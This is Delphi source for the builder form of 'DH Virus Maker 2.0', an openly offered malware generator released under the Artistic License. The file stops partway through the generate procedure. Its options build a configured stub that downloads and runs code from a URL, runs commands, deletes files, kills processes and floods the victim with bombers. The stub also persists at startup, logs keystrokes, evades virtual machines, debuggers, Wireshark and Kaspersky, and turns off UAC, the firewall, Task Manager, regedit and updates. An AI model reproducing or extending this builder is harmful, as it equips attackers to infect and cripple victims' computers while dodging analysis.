{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// DH Virus Maker 2.0
// (C) Doddy Hackman 2016

unit builder;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Imaging.pngimage, Vcl.ExtCtrls,
  Vcl.ComCtrls, Vcl.StdCtrls, Vcl.ImgList, Vcl.Styles.Utils.ComCtrls,
  Vcl.Styles.Utils.Menus,
  Vcl.Styles.Utils.SysStyleHook,
  Vcl.Styles.Utils.SysControls, Vcl.Styles.Utils.Forms,
  Vcl.Styles.Utils.StdCtrls, Vcl.Styles.Utils.ScreenTips, DH_Form_Effects,
  DH_Builder_Tools,
  DH_Server_Manager, DH_Malware_Functions, DH_Malware_Disables;

type
  TFormHome = class(TForm)
    imgLogo: TImage;
    ilIconosPageControl: TImageList;
    ilIconosBuilder: TImageList;
    ilIconosBotones: TImageList;
    pcOptions: TPageControl;
    tsFunctions: TTabSheet;
    gbOptions: TGroupBox;
    tsBuilder: TTabSheet;
    pcBuilderOptions: TPageControl;
    tsConfiguration: TTabSheet;
    gbEnterIPBuilder: TGroupBox;
    btnGenerate: TButton;
    gbOptionsConfiguration: TGroupBox;
    cbHideFiles: TCheckBox;
    cbUseStartup: TCheckBox;
    tsUAC_Tricky: TTabSheet;
    cb_Use_UAC_Tricky: TCheckBox;
    gbTypeUAC_Tricky: TGroupBox;
    rbContinue_if_UAC_is_Off: TRadioButton;
    rbExit_if_UAC_is_Off: TRadioButton;
    tsExtractionPath: TTabSheet;
    gbPathExtractionPath: TGroupBox;
    cmbSpecialPaths: TComboBox;
    txtPath: TEdit;
    rbSelectPath: TRadioButton;
    rbIUseThis: TRadioButton;
    gbEnterFolderExtractionPath: TGroupBox;
    txtFolder: TEdit;
    tsDateTime: TTabSheet;
    cbUseThisDateTime: TCheckBox;
    gbDateTimeConfiguration: TGroupBox;
    lblCreationTime: TLabel;
    lblModifiedTime: TLabel;
    lblLastAccess: TLabel;
    txtCreationTime: TEdit;
    txtModifiedTime: TEdit;
    txtLastAccessTime: TEdit;
    tsFilePumper: TTabSheet;
    cbIUseFilePumper: TCheckBox;
    gbEnterCountFilePumper: TGroupBox;
    txtCount: TEdit;
    upEnterCountFilePumper: TUpDown;
    gbSelectTypeFilePumper: TGroupBox;
    cmbTypes: TComboBox;
    tsExtensionSpoofer: TTabSheet;
    cbUseExtensionSpoofer: TCheckBox;
    gbOptionsExtensionSpoofer: TGroupBox;
    cmbExtensions: TComboBox;
    rbUseSelectExtension: TRadioButton;
    rbUseThisExtension: TRadioButton;
    txtExtension: TEdit;
    tsIconChanger: TTabSheet;
    gbEnterIconIconChanger: TGroupBox;
    txtPathIcon: TEdit;
    btnLoadIcon: TButton;
    gbPreviewIconChanger: TGroupBox;
    imgPreviewIcon: TImage;
    cbUseIconChanger: TCheckBox;
    tsAntisDisables: TTabSheet;
    gbAntis: TGroupBox;
    cbAnti_VirtualPC: TCheckBox;
    cbAnti_VirtualBox: TCheckBox;
    cbAnti_Kaspersky: TCheckBox;
    cbAnti_Wireshark: TCheckBox;
    cbAnti_OllyDbg: TCheckBox;
    cbAnti_Anubis: TCheckBox;
    cbAnti_Debug: TCheckBox;
    cbAnti_VMWare: TCheckBox;
    gbDisables: TGroupBox;
    cbDisable_UAC: TCheckBox;
    cbDisable_Firewall: TCheckBox;
    cbDisable_CMD: TCheckBox;
    cbDisable_Run: TCheckBox;
    cbDisable_Regedit: TCheckBox;
    cbDisable_Taskmgr: TCheckBox;
    cbDisable_Updates: TCheckBox;
    cbDisable_MsConfig: TCheckBox;
    tsAbout: TTabSheet;
    gbAbout: TGroupBox;
    about: TImage;
    panelAbout: TPanel;
    labelAbout: TLabel;
    status: TStatusBar;
    cbDeleteFile: TCheckBox;
    cbKillProcess: TCheckBox;
    cbExecuteCommand: TCheckBox;
    cbOpenCD: TCheckBox;
    cbHideIcons: TCheckBox;
    cbMessagesSingle: TCheckBox;
    cbMessagesBomber: TCheckBox;
    cbSendKeys: TCheckBox;
    cbWriteWord: TCheckBox;
    cbCrazyMouse: TCheckBox;
    cbCrazyHour: TCheckBox;
    cbShutdown: TCheckBox;
    cbReboot: TCheckBox;
    cbCloseSession: TCheckBox;
    cbOpenURL: TCheckBox;
    cbLoadPaint: TCheckBox;
    cbEditTaskbarText: TCheckBox;
    cbTurnOffMonitor: TCheckBox;
    cbSpeak: TCheckBox;
    cbPlayBeeps: TCheckBox;
    cbDownloadAndExecute: TCheckBox;
    cbChangeWallpaper: TCheckBox;
    cbChangeScreensaver: TCheckBox;
    cbPrinterBomber: TCheckBox;
    cbFormBomber: TCheckBox;
    cbHTMLBomber: TCheckBox;
    cbWindowsBomber: TCheckBox;
    cbBlockAll: TCheckBox;
    cbHideTaskbar: TCheckBox;
    tsAntidote: TTabSheet;
    gbAntidote: TGroupBox;
    btnActiveFirewall: TButton;
    btnActiveTaskmgr: TButton;
    btnActiveRegedit: TButton;
    btnActiveUpdates: TButton;
    btnActiveUAC: TButton;
    btnRestoreTaskbarText: TButton;
    btnActiveCMD: TButton;
    btnShowIcons: TButton;
    btnActiveRun: TButton;
    btnShowTaskbar: TButton;
    btnRestoreWallpaper: TButton;
    btnRestoreScreensaver: TButton;
    procedure btnGenerateClick(Sender: TObject);
    procedure btnActiveFirewallClick(Sender: TObject);
    procedure btnActiveRegeditClick(Sender: TObject);
    procedure btnActiveUACClick(Sender: TObject);
    procedure btnActiveCMDClick(Sender: TObject);
    procedure btnActiveRunClick(Sender: TObject);
    procedure btnActiveTaskmgrClick(Sender: TObject);
    procedure btnActiveUpdatesClick(Sender: TObject);
    procedure btnRestoreTaskbarTextClick(Sender: TObject);
    procedure btnShowIconsClick(Sender: TObject);
    procedure btnShowTaskbarClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure btnLoadIconClick(Sender: TObject);
    procedure btnRestoreWallpaperClick(Sender: TObject);
    procedure btnRestoreScreensaverClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    function open_dialog(title, filter: string; filter_index: integer): string;
    function save_dialog(title, filter, default_ext: string;
      filter_index: integer): string;
  end;

var
  FormHome: TFormHome;

implementation

{$R *.dfm}
// Functions

function message_box(title, message_text, type_message: string): string;
begin
  if not(title = '') and not(message_text = '') and not(type_message = '') then
  begin
    try
      begin
        if (type_message = 'Information') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end
        else if (type_message = 'Warning') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONWARNING);
        end
        else if (type_message = 'Question') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONQUESTION);
        end
        else if (type_message = 'Error') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONERROR);
        end
        else
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end;
        Result := '[+] MessageBox : OK';
      end;
    except
      begin
        Result := '[-] Error';
      end;
    end;
  end
  else
  begin
    Result := '[-] Error';
  end;
end;

function TFormHome.open_dialog(title, filter: string;
  filter_index: integer): string;
var
  odOpenFile: TOpenDialog;
  filename: string;
begin
  odOpenFile := TOpenDialog.Create(Self);
  odOpenFile.title := title;
  odOpenFile.InitialDir := GetCurrentDir;
  odOpenFile.Options := [ofFileMustExist];
  odOpenFile.filter := filter;
  odOpenFile.FilterIndex := filter_index;
  if odOpenFile.Execute then
  begin
    filename := odOpenFile.filename;
  end;
  odOpenFile.Free;
  Result := filename;
end;

function TFormHome.save_dialog(title, filter, default_ext: string;
  filter_index: integer): string;
var
  sdSaveFile: TSaveDialog;
  filename: string;
begin
  sdSaveFile := TSaveDialog.Create(Self);
  sdSaveFile.title := title;
  sdSaveFile.InitialDir := GetCurrentDir;
  sdSaveFile.filter := filter;
  sdSaveFile.DefaultExt := default_ext;
  sdSaveFile.FilterIndex := filter_index;
  if sdSaveFile.Execute then
  begin
    filename := sdSaveFile.filename;
  end;
  sdSaveFile.Free;
  Result := filename;
end;

//

procedure TFormHome.FormCreate(Sender: TObject);
var
  effect: T_DH_Form_Effects;
begin
  UseLatestCommonDialogs := False;
  effect := T_DH_Form_Effects.Create();
  effect.Effect_Marquee_Label_DownUp(panelAbout, labelAbout, 1);
  effect.Free;
end;

procedure TFormHome.btnGenerateClick(Sender: TObject);
var
  builder_tools: T_DH_Builder_Tools;
  server_manager: T_DH_Server_Manager;
  stub_generado: string;

var
  op_deletefile, op_kill_process, op_execute_command, op_open_cd, op_hide_icons,
    op_hide_taskbar, op_messages_single, op_messages_bomber, op_sendkeys,
    op_write_word, op_crazy_mouse, op_crazy_hour, op_shutdown, op_reboot,
    op_close_session, op_open_url, op_load_paint, op_edit_taskbar_text,
    op_turn_off_monitor, op_speak, op_play_beeps, op_block_all,
    op_change_wallpaper, op_change_screensaver, op_printer_bomber,
    op_form_bomber, op_html_bomber, op_windows_bomber,
    op_download_and_execute: string;

var
  file_to_delete, process_name, command_to_execute, message_single_title,
    message_single_content, message_bomber_title, message_bomber_content,
    message_bomber_count, text_to_send, word_text_to_send, mouse_count,
    hour_count, url_to_open, new_taskbar_text, text_to_speak, beeps_count,
    url_wallpaper, url_screensaver, file_to_print, printer_bomber_count,
    form_bomber_title, form_bomber_content, form_bomber_count,
    html_bomber_title, html_bomber_content, html_bomber_count, windows_count,
    url_download, new_name: string;

var
  configuration, extraction_config, antis_config, disables_config,
    linea_final: string;

  //
var
  op_hide_files, op_use_startup, op_use_keylogger, op_use_special_path,
    op_i_use_this, op_use_uac_tricky, op_uac_tricky_continue_if_off,
    op_uac_tricky_exit_if_off, op_use_this_datetime, op_anti_virtual_pc,
    op_anti_virtual_box, op_anti_debug, op_anti_wireshark, op_anti_ollydbg,
    op_anti_anubis, op_anti_kaspersky, op_anti_vmware, op_disable_uac,
    op_disable_firewall, op_disable_cmd, op_disable_run, op_disable_taskmgr,
    op_disable_regedit, op_disable_updates, op_disable_msconfig: string;

  //

begin

  stub_generado := save_dialog('Save your malware', 'Exe file|*.exe', 'exe', 0);

  // Functions Malware

  if (cbDeleteFile.Checked) then
  begin
    file_to_delete := InputBox('DH Virus Maker 2.0 - Delete File',
      'File : ', '');
    if not(file_to_delete = '') then
    begin
      op_deletefile := '1';
    end;
  end
  else
  begin
    op_deletefile := '0';
  end;

  if (cbKillProcess.Checked) then
  begin
    process_name := InputBox('DH Virus Maker 2.0 - Kill Process',
      'Process Name : ', '');
    if not(process_name = '') then
    begin
      op_kill_process := '1';
    end;
  end
  else
  begin
    op_kill_process := '0';
  end;

  if (cbExecuteCommand.Checked) then
  begin
    command_to_execute := InputBox('DH Virus Maker 2.0 - Execute Command',
      'Command : ', '');
    if not(command_to_execute = '') then
    begin
      op_execute_command := '1';
    end;
  end
  else
  begin
    op_execute_command := '0';
  end;

  if (cbOpenCD.Checked) then
  begin
    op_open_cd := '1';
  end
  else
  begin
    op_open_cd := '0';
  end;

  if (cbHideIcons.Checked) then
  begin
    op_hide_icons := '1';
  end
  else
  begin
    op_hide_icons := '0';
  end;

  if (cbHideTaskbar.Checked) then
  begin
    op_hide_taskbar := '1';
  end
  else
  begin
    op_hide_taskbar := '0';
  end;

  if (cbMessagesSingle.Checked) then
  begin
    message_single_title := InputBox('DH Virus Maker 2.0 - Message Single',
      'Title : ', '');
    message_single_content := InputBox('DH Virus Maker 2.0 - Message Single',
      'Content : ', '');
    if not(message_single_title = '') and not(message_single_content = '') then
    begin
      op_messages_single := '1';
    end;
  end
  else
  begin
    op_messages_single := '0';
  end;

  if (cbMessagesBomber.Checked) then
  begin
    message_bomber_title := InputBox('DH Virus Maker 2.0 - Message Bomber',
      'Title : ', '');
    message_bomber_content := InputBox('DH Virus Maker 2.0 - Message Bomber',
      'Content : ', '');
    message_bomber_count := InputBox('DH Virus Maker 2.0 - Message Bomber',
      'Count : ', '');
    if not(message_bomber_title = '') and not(message_bomber_content = '') and
      not(message_bomber_count = '') then
    begin
      op_messages_bomber := '1';
    end;
  end
  else
  begin
    op_messages_bomber := '0';
  end;

  if (cbSendKeys.Checked) then
  begin
    text_to_send := InputBox('DH Virus Maker 2.0 - SendKeys', 'Text : ', '');
    if not(text_to_send = '') then
    begin
      op_sendkeys := '1';
    end;
  end
  else
  begin
    op_sendkeys := '0';
  end;

  if (cbWriteWord.Checked) then
  begin
    word_text_to_send := InputBox('DH Virus Maker 2.0 - Write Word',
      'Text : ', '');
    if not(word_text_to_send = '') then
    begin
      op_write_word := '1';
    end;
  end
  else
  begin
    op_write_word := '0';
  end;

  if (cbCrazyMouse.Checked) then
  begin
    mouse_count := InputBox('DH Virus Maker 2.0 - Crazy Mouse', 'Count : ', '');
    if not(mouse_count = '') then
    begin
      op_crazy_mouse := '1';
    end;
  end
  else
  begin
    op_crazy_mouse := '0';
  end;

  if (cbCrazyHour.Checked) then
  begin
    hour_count := InputBox('DH Virus Maker 2.0 - Crazy Hour', 'Count : ', '');
    if not(hour_count = '') then
    begin
      op_crazy_hour := '1';
    end;
  end
  else
  begin
    op_crazy_hour := '0';
  end;

  if (cbShutdown.Checked) then
  begin
    op_shutdown := '1';
  end
  else
  begin
    op_shutdown := '0';
  end;

  if (cbReboot.Checked) then
  begin
    op_reboot := '1';
  end
  else
  begin
    op_reboot := '0';
  end;

  if (cbCloseSession.Checked) then
  begin
    op_close_session := '1';
  end
  else
  begin
    op_close_session := '0';
  end;

  if (cbOpenURL.Checked) then
  begin
    url_to_open := InputBox('DH Virus Maker 2.0 - Open URL', 'URL : ', '');
    if not(url_to_open = '') then
    begin
      op_open_url := '1';
    end;
  end
  else
  begin
    op_open_url := '0';
  end;

  if (cbLoadPaint.Checked) then
  begin
    op_load_paint := '1';
  end
  else
  begin
    op_load_paint := '0';
  end;

  if (cbEditTaskbarText.Checked) then
  begin
    new_taskbar_text := InputBox('DH Virus Maker 2.0 - Edit Taskbar Text',
      'Text : ', '');
    if not(new_taskbar_text = '') then
    begin
      op_edit_taskbar_text := '1';
    end;
  end
  else
  begin
    op_edit_taskbar_text := '0';
  end;

  if (cbTurnOffMonitor.Checked) then
  begin
    op_turn_off_monitor := '1';
  end
  else
  begin
    op_turn_off_monitor := '0';
  end;

  if (cbSpeak.Checked) then
  begin
    text_to_speak := InputBox('DH Virus Maker 2.0 - Speak', 'Text : ', '');
    if not(text_to_speak = '') then
    begin
      op_speak := '1';
    end;
  end
  else
  begin
    op_speak := '0';
  end;

  if (cbPlayBeeps.Checked) then
  begin
    beeps_count := InputBox('DH Virus Maker 2.0 - Play Beeps', 'Count : ', '');
    if not(beeps_count = '') then
    begin
      op_play_beeps := '1';
    end;
  end
  else
  begin
    op_play_beeps := '0';
  end;

  if (cbBlockAll.Checked) then
  begin
    op_block_all := '1';
  end
  else
  begin
    op_block_all := '0';
  end;

  if (cbChangeWallpaper.Checked) then
  begin
    url_wallpaper := InputBox('DH Virus Maker 2.0 - Change Wallpaper',
      'URL : ', '');
    if not(url_wallpaper = '') then
    begin
      op_change_wallpaper := '1';
    end;
  end
  else
  begin
    op_change_wallpaper := '0';
  end;

  if (cbChangeScreensaver.Checked) then
  begin
    url_screensaver := InputBox('DH Virus Maker 2.0 - Change ScreenSaver',
      'URL : ', '');
    if not(url_screensaver = '') then
    begin
      op_change_screensaver := '1';
    end;
  end
  else
  begin
    op_change_screensaver := '0';
  end;

  if (cbPrinterBomber.Checked) then
  begin
    file_to_print := InputBox('DH Virus Maker 2.0 - Printer Bomber',
      'File to print : ', '');
    printer_bomber_count := InputBox('DH Virus Maker 2.0 - Printer Bomber',
      'Count : ', '');
    if not(file_to_print = '') and not(printer_bomber_count = '') then
    begin
      op_printer_bomber := '1';
    end;
  end
  else
  begin
    op_printer_bomber := '0';
  end;

  if (cbFormBomber.Checked) then
  begin
    form_bomber_title := InputBox('DH Virus Maker 2.0 - Form Bomber',
      'Title : ', '');
    form_bomber_content := InputBox('DH Virus Maker 2.0 - Form Bomber',
      'Content : ', '');
    form_bomber_count := InputBox('DH Virus Maker 2.0 - Form Bomber',
      'Count : ', '');
    if not(form_bomber_title = '') and not(form_bomber_content = '') and
      not(form_bomber_count = '') then
    begin
      op_form_bomber := '1';
    end;
  end
  else
  begin
    op_form_bomber := '0';
  end;

  if (cbHTMLBomber.Checked) then
  begin
    html_bomber_title := InputBox('DH Virus Maker 2.0 - HTML Bomber',
      'Title : ', '');
    html_bomber_content := InputBox('DH Virus Maker 2.0 - HTML Bomber',
      'Content : ', '');
    html_bomber_count := InputBox('DH Virus Maker 2.0 - HTML Bomber',
      'Count : ', '');
    if not(html_bomber_title = '') and not(html_bomber_content = '') and
      not(html_bomber_count = '') then
    begin
      op_html_bomber := '1';
    end;
  end
  else
  begin
    op_html_bomber := '0';
  end;

  if (cbWindowsBomber.Checked) then
  begin
    windows_count := InputBox('DH Virus Maker 2.0 - Windows Bomber',
      'Count : ', '');
    if not(windows_count = '') then
    begin
      op_windows_bomber := '1';
    end;
  end
  else
  begin
    op_windows_bomber := '0';
  end;

  if (cbDownloadAndExecute.Checked) then
  begin
    url_download := InputBox('DH Virus Maker 2.0 - Download and Execute',
      'URL : ', '');
    new_name := InputBox('DH Virus Maker 2.0 - Download and Execute',
      'New Name : ', '');
    if not(url_download = '') and not(new_name = '') then
    begin
      op_download_and_execute := '1';
    end;
  end
  else
  begin
    op_download_and_execute := '0';
  end;

  //

  if (cbHideFiles.Checked) then
  begin
    op_hide_files := '1';
  end
  else
  begin
    op_hide_files := '0';
  end;

  if (cbUseStartup.Checked) then
  begin
    op_use_startup := '1';
  end
  else
  begin
    op_use_startup := '0';
  end;

  if (cb_Use_UAC_Tricky.Checked) then
  begin
    op_use_uac_tricky := '1';
  end
  else
  begin
    op_use_uac_tricky := '0';
  end;

  if (rbContinue_if_UAC_is_Off.Checked) then
  begin
    op_uac_tricky_continue_if_off := '1';
  end
  else
  begin
    op_uac_tricky_continue_if_off := '0';
  end;

  if (rbExit_if_UAC_is_Off.Checked) then
  begin
    op_uac_tricky_exit_if_off := '1';
  end
  else
  begin
    op_uac_tricky_exit_if_off := '0';
  end;

  if (rbSelectPath.Checked) then
  begin
    op_use_special_path := '1';
  end
  else
  begin
    op_use_special_path := '0';
  end;

  if (rbIUseThis.Checked) then
  begin
    op_i_use_this := '1';
  end
  else
  begin
    op_i_use_this := '0';
  end;

  if (cbUseThisDateTime.Checked) then
  begin
    op_use_this_datetime := '1';
  end
  else
  begin
    op_use_this_datetime := '0';
  end;

  if (cbAnti_VirtualPC.Checked) then
  begin
    op_anti_virtual_pc := '1';
  end
  else
  begin
    op_anti_virtual_pc := '0';
  end;

  if (cbAnti_VirtualBox.Checked) then
  begin
    op_anti_virtual_box := '1';
  end
  else
  begin
    op_anti_virtual_box := '0';
  end;

  if (cbAnti_Debug.Checked) then
  begin
    op_anti_debug := '1';
  end
  else
  begin
    op_anti_debug := '0';
  end;

  if (cbAnti_Wireshark.Checked) then
  begin
    op_anti_wireshark := '1';
  end
  else
  begin
    op_anti_wireshark := '0';
  end;

  if (cbAnti_OllyDbg.Checked) then
  begin
    op_anti_ollydbg := '1';
  end
  else
  begin
    op_anti_ollydbg := '0';
  end;

  if (cbAnti_Anubis.Checked) then
  begin
    op_anti_anubis := '1';
  end
  else
  begin
    op_anti_anubis := '0';
  end;

  if (cbAnti_Kaspersky.Checked) then
  begin
    op_anti_kaspersky := '1';
  end
  else
  begin
    op_anti_kaspersky := '0';
  end;

  if (cbAnti_VMWare.Checked) then
  begin
    op_anti_vmware := '1';
  end
  else
  begin
    op_anti_vmware := '0';
  end;

  if (cbDisable_UAC.Checked) then
  begin
    op_disable_uac := '1';
  end
  else
  begin
    op_disable_uac := '0';
  end;

  if (cbDisable_Firewall.Checked) then
  begin
    op_disable_firewall := '1';
  end
  else
  begin
    op_disable_firewall := '0';
  end;

  if (cbDisable_CMD.Checked) then
  begin
    op_disable_cmd := '1';
  end
  else
  begin
    op_disable_cmd := '0';
  end;

  if (cbDisable_Run.Checked) then
  begin
    op_disable_run := '1';
  end
  else
  begin
    op_disable_run := '0';
  end;

  if (cbDisable_Taskmgr.Checked) then
  begin
    op_disable_taskmgr := '1';
  end
  else
  begin
    op_disable_taskmgr := '0';
  end;

  if (cbDisable_Regedit.Checked) then
  begin
    op_disable_regedit := '1';
  end
  else
  begin
    op_disable_regedit := '0';
  end;

  if (cbDisable_Updates.Checked) then
  begin
    op_disable_updates := '1';
  end
  else
  begin
    op_disable_updates := '0';
  end;

  if (cbDisable_MsConfig.Checked) then
  begin
    op_disable_msconfig := '1';
  end
  else
  begin
    op_disable_msconfig := '0';
  end;

  //

  configuration := '[op_deletefile]' + op_deletefile +
    '[op_deletefile][file_to_delete]' + file_to_delete +
    '[file_to_delete][op_kill_process]' + op_kill_process +
    '[op_kill_process][process_name]' + process_name +
    '[process_name][op_execute_command]' + op_execute_command +
    '[op_execute_command][command_to_execute]' + command_to_execute +
    '[command_to_execute][op_open_cd]' + op_open_cd +
    '[op_open_cd][op_hide_icons]' + op_hide_icons +
    '[op_hide_icons][op_hide_taskbar]' + op_hide_taskbar +
    '[op_hide_taskbar][op_messages_single]' + op_messages_single +
    '[op_messages_single][message_single_title]' + message_single_title +
    '[message_single_title][message_single_content]' + message_single_content +
    '[message_single_content][op_messages_bomber]' + op_messages_bomber +
    '[op_messages_bomber][message_bomber_title]' + message_bomber_title +
    '[message_bomber_title][message_bomber_content]' + message_bomber_content +
    '[message_bomber_content][message_bomber_count]' + message_bomber_count +
    '[message_bomber_count][op_sendkeys]' + op_sendkeys +
    '[op_sendkeys][text_to_send]' + text_to_send +
    '[text_to_send][op_write_word]' + op_write_word +
    '[op_write_word][word_text_to_send]' + word_text_to_send +
    '[word_text_to_send][op_crazy_mouse]' + op_crazy_mouse +
    '[op_crazy_mouse][mouse_count]' + mouse_count +
    '[mouse_count][op_crazy_hour]' + op_crazy_hour +
    '[op_crazy_hour][hour_count]' + hour_count + '[hour_count][op_shutdown]' +
    op_shutdown + '[op_shutdown][op_reboot]' + op_reboot +
    '[op_reboot][op_close_session]' + op_close_session +
    '[op_close_session][op_open_url]' + op_open_url +
    '[op_open_url][url_to_open]' + url_to_open + '[url_to_open][op_load_paint]'
    + op_load_paint + '[op_load_paint][op_edit_taskbar_text]' +
    op_edit_taskbar_text + '[op_edit_taskbar_text][new_taskbar_text]' +
    new_taskbar_text + '[new_taskbar_text][op_turn_off_monitor]' +
    op_turn_off_monitor + '[op_turn_off_monitor][op_speak]' + op_speak +
    '[op_speak][text_to_speak]' + text_to_speak +
    '[text_to_speak][op_play_beeps]' + op_play_beeps +
    '[op_play_beeps][beeps_count]' + beeps_count + '[beeps_count][op_block_all]'
    + op_block_all + '[op_block_all][op_change_wallpaper]' + op_change_wallpaper
    + '[op_change_wallpaper][url_wallpaper]' + url_wallpaper +
    '[url_wallpaper][op_change_screensaver]' + op_change_screensaver +
    '[op_change_screensaver][url_screensaver]' + url_screensaver +
    '[url_screensaver][op_printer_bomber]' + op_printer_bomber +
    '[op_printer_bomber][file_to_print]' + file_to_print +
    '[file_to_print][printer_bomber_count]' + printer_bomber_count +
    '[printer_bomber_count][op_form_bomber]' + op_form_bomber +
    '[op_form_bomber][form_bomber_title]' + form_bomber_title +
    '[form_bomber_title][form_bomber_content]' + form_bomber_content +
    '[form_bomber_content][form_bomber_count]' + form_bomber_count +
    '[form_bomber_count][op_html_bomber]' + op_html_bomber +
    '[op_html_bomber][html_bomber_title]' + html_bomber_title +
    '[html_bomber_title][html_bomber_content]' + html_bomber_content +
    '[html_bomber_content][html_bomber_count]' + html_bomber_count +
    '[html_bomber_count][op_windows_bomber]' + op_windows_bomber +
    '[op_windows_bomber][windows_count]' + windows_count +
    '[windows_count][op_download_and_execute]' + op_download_and_execute +
    '[op_download_and_execute][url_download]' + url_download +
    '[url_download][new_name]' + new_name + '[new_name]';

  configuration := configuration + '[active]1[active][op_hide_files]' +
    op_hide_files + '[op_hide_files]' + '[op_use_startup]' + op_use_startup +
    '[op_use_startup]' + '[op_keylogger]' + op_use_keylogger + '[op_keylogger]';
